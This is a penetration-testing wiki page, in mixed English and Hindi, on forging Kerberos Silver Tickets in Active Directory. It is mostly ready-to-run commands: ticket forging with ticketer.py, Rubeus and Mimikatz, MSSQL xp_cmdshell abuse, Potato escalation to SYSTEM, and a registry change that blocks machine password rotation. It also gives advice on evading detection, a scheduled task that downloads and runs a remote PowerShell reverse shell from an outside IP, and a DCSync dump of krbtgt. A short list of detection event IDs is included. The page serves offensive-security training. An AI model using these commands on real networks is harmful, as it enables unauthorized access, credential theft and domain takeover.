# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

### Modern Kerberos changes (AES-only domains)

- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.

For ticket crafting, different tools are employed based on the operating system:

### Linux पर
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows पर
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS service को पीड़ित की फ़ाइल सिस्टम तक पहुँचने के लिए एक आम लक्ष्य के रूप में दर्शाया गया है, लेकिन HOST और RPCSS जैसी अन्य सेवाओं का उपयोग tasks और WMI queries के लिए भी किया जा सकता है।

### उदाहरण: MSSQL service (MSSQLSvc) + Potato to SYSTEM

यदि आपके पास किसी SQL सेवा खाते (उदा., sqlsvc) का NTLM hash (या AES key) है, तो आप MSSQL SPN के लिए एक TGS बनाकर SQL सेवा के प्रति किसी भी उपयोगकर्ता का impersonate कर सकते हैं। वहाँ से, xp_cmdshell सक्षम करके SQL सेवा खाते के रूप में कमांड निष्पादित करें। यदि उस token में SeImpersonatePrivilege मौजूद है, तो Potato को chain करके SYSTEM तक escalate करें।
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- यदि प्राप्त संदर्भ में SeImpersonatePrivilege हो (अक्सर service accounts के लिए सच), SYSTEM पाने के लिए Potato variant का उपयोग करें:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
More details on abusing MSSQL and enabling xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## उपलब्ध सेवाएं

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS के अनुसार भी:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ मामलों में आप सीधे इसके लिए अनुरोध कर सकते हैं: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **No preceding 4768/4769 on the DC** for the same client/service is a common indicator of a forged TGS being presented directly to the service.
- Abnormally long ticket lifetime or unexpected encryption type (RC4 when domain enforces AES) also stand out in 4769/4624 data.

## Persistence

मशीनों के पासवर्ड को हर 30 दिनों में rotate होने से रोकने के लिए `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` सेट करें या आप `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` को 30 दिनों से बड़ी मान पर सेट कर सकते हैं ताकि यह बताए कि मशीन का पासवर्ड कब rotate किया जाना चाहिए।

## Abusing Service tickets

In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.

### CIFS

With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
आप होस्ट के अंदर शेल प्राप्त कर पाएंगे या **psexec** का उपयोग करके किसी भी कमांड को निष्पादित कर सकेंगे:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### होस्ट

इस अनुमति के साथ आप रिमोट कंप्यूटरों पर अनुसूचित कार्य बना सकते हैं और किसी भी कमांड को निष्पादित कर सकते हैं:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

इन टिकटों के साथ आप **लक्षित सिस्टम में WMI निष्पादित कर सकते हैं**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
निम्नलिखित पृष्ठ में **wmiexec के बारे में अधिक जानकारी** देखें:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

किसी कंप्यूटर पर winrm एक्सेस होने पर आप इसे **एक्सेस कर सकते हैं** और यहाँ तक कि PowerShell भी प्राप्त कर सकते हैं:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
निम्नलिखित पृष्ठ देखें ताकि आप **winrm का उपयोग करके रिमोट होस्ट से कनेक्ट करने के और तरीके** सीख सकें:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> ध्यान दें कि रिमोट कंप्यूटर पर **winrm सक्रिय और listening** होना चाहिए ताकि आप इसे access कर सकें.

### LDAP

इस अधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस को dump कर सकते हैं:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync के बारे में और जानें** निम्नलिखित पृष्ठ पर:


{{#ref}}
dcsync.md
{{#endref}}


## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
